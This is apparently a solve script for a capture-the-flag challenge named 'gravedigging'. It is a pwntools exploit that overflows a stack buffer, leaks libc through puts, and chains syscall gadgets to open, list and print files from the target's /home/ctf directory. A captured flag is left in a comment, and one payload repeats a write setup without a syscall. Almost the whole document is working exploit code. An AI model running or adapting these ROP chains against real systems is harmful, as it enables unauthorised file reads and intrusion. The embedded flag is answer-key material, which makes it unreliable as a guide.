from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4011cf
continue
'''.format(**locals())

exe = './gravedigging'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['wt.exe', 'bash', '-c']
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 24

io = start()

bss_addr = elf.bss()
flag = 0x2f666c61672e747874783030
pop_rax = p64(0x4011aa)  
pop_rbp = p64(0x40117d)  
pop_rdi = p64(0x4011a0)  
pop_rdx = p64(0x4011af)  
pop_rsi = p64(0x4011a5)
syscall = p64(0x40119a)

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]



payload = flat([
    b"A"*(offset),
    pop_rdi,
    puts_got,
    puts_plt,
    p64(elf.sym["vuln"])

])

io.sendlineafter(b'?\n',payload)
puts = u64((io.recv().split(b"\n"))[0].ljust(8,b'\x00'))
libc.address = puts - libc.sym["puts"]
#print(u64(leak[0].ljust(8,b'\x00')))
print(hex(libc.address))

libc_push_rsi = p64(0x860c6 + libc.address)


payload = flat([
    b"A"*(offset),
    pop_rax, p64(0),
    pop_rdi, p64(0),
    pop_rsi, p64(bss_addr),
    pop_rdx, p64(100),
    syscall,
    pop_rax, p64(2),
    pop_rdi, p64(bss_addr),
    pop_rsi, p64(0),
    pop_rdx, p64(0),
    syscall,
    pop_rax + p64(0),
    pop_rdi + p64(3),
    pop_rsi + p64(bss_addr),
    pop_rdx + p64(100),
    syscall,
    pop_rax + p64(1),
    pop_rdi + p64(1),
    pop_rsi + p64(bss_addr),
    pop_rdx + p64(100),
    syscall,
    
])

payload2 = flat([
    b"A" * offset, 
    pop_rax, p64(0),
    pop_rdi, p64(0),
    pop_rsi, p64(bss_addr),
    pop_rdx, p64(12),  
    syscall,
    pop_rax, p64(2),
    pop_rdi, p64(bss_addr),
    pop_rsi, p64(0),
    pop_rdx, p64(0),
    syscall,
    pop_rax, p64(217),              
    pop_rdi, p64(3),              
    pop_rsi, p64(bss_addr+8),       
    pop_rdx, p64(512),              
    syscall,
    pop_rax, p64(1),
    pop_rdi, p64(1),
    pop_rsi, p64(bss_addr + 16),
    pop_rdx, p64(200),
    pop_rax, p64(1),
    pop_rdi, p64(1),
    pop_rsi, p64(bss_addr + 16),
    pop_rdx, p64(300),
    syscall,
    p64(elf.sym["vuln"])
])

#io.sendline(payload2)
#io.sendline(b'/home/ctf\0')
io.sendline(payload)
io.sendline(b'/home/ctf/Sara Flagg 1990, 2025 -- she sure loved ctfs\0')
#deadface{Th3_M05T_P0w3RfUl_5P3LLS_4Re_TH3_On35_N0B0dy_ExP3CT5}



#io.sendline(b'/home/w6rst/Documents/CTF/deadfacectf/grave-digging/')
#io.sendline(b"/home/w6rst/Documents/CTF/deadfacectf/grave-digging/flag.txt\0")

io.interactive()
